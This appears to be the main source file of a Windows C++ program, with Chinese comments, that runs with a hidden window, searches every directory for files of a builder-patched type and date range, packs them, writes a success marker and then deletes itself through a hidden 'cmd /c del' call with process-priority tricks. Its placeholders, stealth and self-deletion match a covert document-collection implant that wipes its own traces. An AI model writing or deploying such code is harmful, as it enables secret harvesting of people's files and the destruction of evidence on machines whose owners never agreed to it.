// FileSearchAndCompress.cpp : 定义应用程序的入口点。
//

#include "stdafx.h"
#include "FileSearchAndCompress.h"
#include "CFile.h"
#include <shlwapi.h>
#include <shellapi.h>
#include <shlobj.h>

//#pragma comment  (lib,"shell32.lib")

#define MAX_LOADSTRING 100

// 全局变量:
HINSTANCE hInst;								// 当前实例
TCHAR szTitle[MAX_LOADSTRING];					// 标题栏文本
TCHAR szWindowClass[MAX_LOADSTRING];			// 主窗口类名

char m_FileType[MAX_PATH]   = "!!!Type!!!";
char m_StartTime[MAX_PATH]  = "!!!StartTime!!!";
char m_EndTime[MAX_PATH]    = "!!!EndTime!!!";


// 此代码模块中包含的函数的前向声明:
ATOM				MyRegisterClass(HINSTANCE hInstance);
BOOL				InitInstance(HINSTANCE, int);
LRESULT CALLBACK	WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK	About(HWND, UINT, WPARAM, LPARAM);

//自删除
BOOL SelfDel();
//定时发送定时器
//void CALLBACK TimeProc(HWND hwnd,UINT message, UINT_PTR idTimer,DWORD dwTime);
//void  GetConfig();
int APIENTRY _tWinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPTSTR    lpCmdLine,
                     int       nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

 	// TODO: 在此放置代码。
	MSG msg;
	HACCEL hAccelTable;

	// 初始化全局字符串
	LoadString(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
	LoadString(hInstance, IDC_FILESEARCHANDCOMPRESS, szWindowClass, MAX_LOADSTRING);
	MyRegisterClass(hInstance);

	// 执行应用程序初始化:
	if (!InitInstance (hInstance, nCmdShow))
	{
		return FALSE;
	}

	hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_FILESEARCHANDCOMPRESS));

    //GetConfig();

	    //字节转换
	TCHAR m_wFileType[MAX_PATH]   = {0};
    TCHAR m_wStartTime[MAX_PATH]  = {0};
    TCHAR m_wEndTime[MAX_PATH]    = {0};

	int len = MultiByteToWideChar(CP_ACP,0,m_FileType,strlen(m_FileType),NULL,0);  
    MultiByteToWideChar(CP_ACP,0,m_FileType,strlen(m_FileType),m_wFileType,len);  
    //m_wFileType[len]='\0';  
	
	len = MultiByteToWideChar(CP_ACP,0,m_StartTime,strlen(m_StartTime),NULL,0);  
    MultiByteToWideChar(CP_ACP,0,m_StartTime,strlen(m_StartTime),m_wStartTime,len);  
    //m_wStartTime[len]='\0';  
	
	len = MultiByteToWideChar(CP_ACP,0,m_EndTime,strlen(m_EndTime),NULL,0);  
    MultiByteToWideChar(CP_ACP,0,m_EndTime,strlen(m_EndTime),m_wEndTime,len);  
    //m_wEndTime[len]='\0';  

	//::MessageBox(NULL,m_wStartTime,_T("Tips"),MB_OK);
	//::MessageBox(NULL,m_wEndTime,_T("Tips"),MB_OK);
	//::MessageBox(NULL,m_wFileType,_T("Tips"),MB_OK);

	//搜索打包文件
    CDFile* m_File = new CDFile();
	
    m_File->OnSearechFile(m_wFileType,_T(""),m_wStartTime,m_wEndTime,true); //全目录

	//测试
	//m_File->OnSearechFile(_T("doc"),_T(""),_T("2019-1-13"),_T("2019-12-13"),true);

	delete m_File;


    //打包结束标志
	TCHAR   szConfig[MAX_PATH] = {0};
	TCHAR   szTemp[MAX_PATH] = {0};
	::GetModuleFileName(NULL, szConfig, MAX_PATH);
	int nPathLen = 0;

	for (int i = 0; i != MAX_PATH; i++)
	{
		if (!szConfig[i])
		{ break; }

		if (szConfig[i] == _T('\\'))
		{ nPathLen = i; }
	}
	szConfig[nPathLen] = _T('\0');

	SYSTEMTIME sysTime;
	::GetSystemTime(&sysTime);
	::_stprintf_s(szTemp, MAX_PATH, _T("\\Success%.2d%.2d%.2d%.2d.txt"), sysTime.wMonth, sysTime.wDay, sysTime.wHour, sysTime.wMinute);
    _tcscat_s(szConfig,MAX_PATH,szTemp);

	FILE *file = _tfopen(szConfig, _T("wb"));	
	fclose(file);


    Sleep(100);
	
	//自删除
	SelfDel();


	exit(0);

	// 主消息循环:
	while (GetMessage(&msg, NULL, 0, 0))
	{
		if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}

	return (int) msg.wParam;
}



//
//  函数: MyRegisterClass()
//
//  目的: 注册窗口类。
//
//  注释:
//
//    仅当希望
//    此代码与添加到 Windows 95 中的“RegisterClassEx”
//    函数之前的 Win32 系统兼容时，才需要此函数及其用法。调用此函数十分重要，
//    这样应用程序就可以获得关联的
//    “格式正确的”小图标。
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
	WNDCLASSEX wcex;

	wcex.cbSize = sizeof(WNDCLASSEX);

	wcex.style			= CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc	= WndProc;
	wcex.cbClsExtra		= 0;
	wcex.cbWndExtra		= 0;
	wcex.hInstance		= hInstance;
	wcex.hIcon			= LoadIcon(hInstance, MAKEINTRESOURCE(IDI_FILESEARCHANDCOMPRESS));
	wcex.hCursor		= LoadCursor(NULL, IDC_ARROW);
	wcex.hbrBackground	= (HBRUSH)(COLOR_WINDOW+1);
	wcex.lpszMenuName	= MAKEINTRESOURCE(IDC_FILESEARCHANDCOMPRESS);
	wcex.lpszClassName	= szWindowClass;
	wcex.hIconSm		= LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

	return RegisterClassEx(&wcex);
}

//
//   函数: InitInstance(HINSTANCE, int)
//
//   目的: 保存实例句柄并创建主窗口
//
//   注释:
//
//        在此函数中，我们在全局变量中保存实例句柄并
//        创建和显示主程序窗口。
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   HWND hWnd;

   hInst = hInstance; // 将实例句柄存储在全局变量中

   hWnd = CreateWindow(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
      CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, NULL, NULL, hInstance, NULL);

   if (!hWnd)
   {
      return FALSE;
   }

   ShowWindow(hWnd, SW_HIDE);
   UpdateWindow(hWnd);

    //设置定时器         
    //SetTimer(hWnd, 1, 1000 * 2, TimeProc);

   return TRUE;
}

//
//  函数: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  目的: 处理主窗口的消息。
//
//  WM_COMMAND	- 处理应用程序菜单
//  WM_PAINT	- 绘制主窗口
//  WM_DESTROY	- 发送退出消息并返回
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	int wmId, wmEvent;
	PAINTSTRUCT ps;
	HDC hdc;
   

	switch (message)
	{
	case WM_COMMAND:
		wmId    = LOWORD(wParam);
		wmEvent = HIWORD(wParam);
		// 分析菜单选择:
		switch (wmId)
		{
		case IDM_ABOUT:
			DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
			break;
		case IDM_EXIT:
			DestroyWindow(hWnd);
			break;
		default:
			return DefWindowProc(hWnd, message, wParam, lParam);
		}
		break;
	case WM_PAINT:
		hdc = BeginPaint(hWnd, &ps);
		// TODO: 在此添加任意绘图代码...
		EndPaint(hWnd, &ps);
		break;
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}

// “关于”框的消息处理程序。
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	UNREFERENCED_PARAMETER(lParam);
	switch (message)
	{
	case WM_INITDIALOG:
		return (INT_PTR)TRUE;

	case WM_COMMAND:
		if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
		{
			EndDialog(hDlg, LOWORD(wParam));
			return (INT_PTR)TRUE;
		}
		break;
	}
	return (INT_PTR)FALSE;
}

//void  GetConfig()
//{
//	TCHAR   szConfig[MAX_PATH] = {0};
//	CString m_strConfig;
//	::GetModuleFileName(NULL, szConfig, MAX_PATH);
//	int nPathLen = 0;
//
//	for (int i = 0; i != MAX_PATH; i++)
//	{
//		if (!szConfig[i])
//			{ break; }
//
//		if (szConfig[i] == _T('\\'))
//			{ nPathLen = i; }
//	}
//
//	szConfig[nPathLen] = _T('\0');
//
//	m_strConfig = szConfig;
//	m_strConfig.Append(_T("\\FileConfig.ini"));
//
//
//	if (!::PathFileExists(m_strConfig)) {
//		return;
//	}
//
//	TCHAR* pRead = (TCHAR*)malloc(0x400);
//
//	ZeroMemory(pRead, 0x400);
//	GetPrivateProfileString(_T("Config"), _T("Type"), NULL, pRead, 0x400, m_strConfig);
//	_tcscpy_s(m_FileType,0x400,pRead);
//
//	ZeroMemory(pRead, 0x400);
//	GetPrivateProfileString(_T("Config"), _T("StartTime"), NULL, pRead, 0x400, m_strConfig);
//	_tcscpy_s(m_StartTime,0x400,pRead);
//
//	ZeroMemory(pRead, 0x400);
//	GetPrivateProfileString(_T("Config"), _T("EndTime"), NULL, pRead, 0x400, m_strConfig);
//	_tcscpy_s(m_EndTime,0x400,pRead);
//
//	//ZeroMemory(pRead, 0x400);
//	//GetPrivateProfileString(_T("Config"), _T("Path"), NULL, pRead, 0x400, m_strConfig);
//	//_tcscpy_s(m_FilePath,0x400,pRead);
//
//
//}

//发送定时器
//void CALLBACK TimeProc(HWND hwnd,UINT message,UINT_PTR idTimer,DWORD dwTime)
//{
//	KillTimer(hwnd, 1);	
//}


BOOL SelfDel()
{

	SHELLEXECUTEINFO sei;

	TCHAR szModule [MAX_PATH],szComspec[MAX_PATH],szParams [MAX_PATH];

	// 获得自身文件名. 获取cmd的全路径文件名

	if((GetModuleFileName(0,szModule,MAX_PATH)!=0) &&

		(GetShortPathName(szModule,szModule,MAX_PATH)!=0) &&

		(GetEnvironmentVariable(_T("COMSPEC"),szComspec,MAX_PATH)!=0))

	{

		// 设置命令参数.

		lstrcpy(szParams,_T("/c del "));

		lstrcat(szParams, szModule);

		lstrcat(szParams, _T(" > nul"));

		// 设置结构成员.

		sei.cbSize = sizeof(sei);

		sei.hwnd = 0;

		sei.lpVerb = _T("Open");

		sei.lpFile = szComspec;

		sei.lpParameters = szParams;

		sei.lpDirectory = 0; sei.nShow = SW_HIDE;

		sei.fMask = SEE_MASK_NOCLOSEPROCESS;

		// 创建cmd进程.

		if(ShellExecuteEx(&sei))

		{

			// 设置cmd进程的执行级别为空闲执行,使本程序有足够的时间从内存中退出.

			SetPriorityClass(sei.hProcess,IDLE_PRIORITY_CLASS);

			// 将自身进程的优先级置高

			SetPriorityClass(GetCurrentProcess(),REALTIME_PRIORITY_CLASS);

			SetThreadPriority(GetCurrentThread(),THREAD_PRIORITY_TIME_CRITICAL);

			// 通知Windows资源浏览器,本程序文件已经被删除.

			SHChangeNotify(SHCNE_DELETE,SHCNF_PATH,szModule,0);

			return TRUE;

		}

		return FALSE;
	}

	return FALSE;
}
